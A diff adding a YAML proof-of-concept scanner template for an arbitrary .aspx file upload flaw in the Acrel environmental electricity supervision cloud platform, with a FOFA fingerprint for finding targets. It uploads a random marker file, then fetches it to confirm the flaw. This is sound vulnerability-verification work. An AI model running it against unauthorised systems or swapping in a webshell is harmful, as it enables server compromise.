@@ -1,0 +1,25 @@
+id: poc-yaml-acreldny-uploadattachment-anyfile-upload
+info:
+  name: 安科瑞环保用电监管云平台 uploadAttachment 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 安科瑞环保用电监管云平台
+  fofa: body="myCss/phone.css"
+variables:
+  t1: base64(random_str(7))
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /api/APP/uploadAttachment
+  headers:
+    Content-Type: application/json
+  data: '{"FileStr":"{{.t2}}","FileFormat":"aspx"}'
+  expression: status_code == 200 && contains(body,"成功") && contains(body,".aspx")
+    && contains(content_type,"application/json")
+  output:
+  - regex_match(body,"/UpLoad/Temp/(?P<file>[0-9]{18}).aspx")
+- method: GET
+  path: /UpLoad/Temp/{{.file}}.aspx
+  expression: status_code == 200 && body == t1
+transport: http
